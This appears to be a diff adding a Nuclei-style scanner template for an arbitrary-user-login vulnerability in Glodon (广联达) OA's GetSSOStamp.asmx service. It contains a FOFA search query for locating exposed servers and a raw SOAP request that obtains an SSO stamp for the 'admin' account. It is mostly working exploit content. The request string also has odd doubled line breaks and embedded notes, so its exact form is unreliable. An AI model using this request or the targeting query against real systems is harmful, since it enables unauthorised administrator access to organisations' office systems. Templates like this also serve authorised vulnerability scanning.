@@ -1,0 +1,19 @@
+id: poc-euf5xrwyrnd8guxe
+info:
+  name: 广联达OA GetSSOStamp.asmx 任意用户登录漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/euf5xrwyrnd8guxe'
+  tags: unauth,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: euf5xrwyrnd8guxe
+    fofa: body="Services/Identification/login.ashx" || header="Services/Identification/login.ashx" || banner="Services/Identification/login.ashx" || fid="/yV4r5PdARKT4jaqLjJYqw=="
+http:
+- raw:
+  - "POST /WebService/Lk6SyncService/DirectToOthers/GetSSOStamp.asmx HTTP/1.1\n\nContent-Type: text/xml; charset=utf-8\n\nSOAPAction: \"http://tempuri.org/GetStamp\"\n\n\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n\n <soap:Body>\n\n   <GetStamp xmlns=\"http://tempuri.org/\">\n\n    <usercode>admin</usercode>\n\n   </GetStamp>\n\n </soap:Body>\n\n</soap:Envelope>\n\n# 响应代码特征\n200\n\n# 响应内容特征\nGetStamp\n\n# 上传文件定位\n暂无"
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
